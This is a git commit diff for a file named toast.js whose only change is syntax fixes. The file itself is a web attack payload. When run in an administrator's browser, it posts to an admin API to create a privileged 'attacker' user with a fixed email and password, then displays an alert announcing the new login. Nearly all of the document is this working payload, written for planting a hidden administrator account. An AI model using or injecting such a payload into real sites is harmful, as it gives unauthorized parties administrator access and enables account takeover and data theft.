f57299385de0ce9f5eb0f57cbfce006106415075
Mahdi Zolqadr <32035745+mahdizolqadr@users.noreply.github.com>
2023-01-03 12:43:43 +0330

    Update toast.js

--- toast.js
+++ toast.js
@@ -1,8 +1,8 @@
-console.log("start ..."
+console.log("start ...");
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "/api/web/admin/user/create", true);
-console.log("post data to your api")
+console.log("post data to your api");
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({"firstName":"attacker","lastName":"-","email":"attacker1@atacker.ir","phone":"+989123456789","status":"ENABLED","inputPassword":"a@bemSa123","userProducts":[{"product":null,"enabled":true,"roles":[1,2]}]}));
-console.log("success")
-alert("now you can login with attacker1@atacker.ir and password: a@bemSa123")
+console.log("success");
+alert("now you can login with attacker1@atacker.ir and password: a@bemSa123");
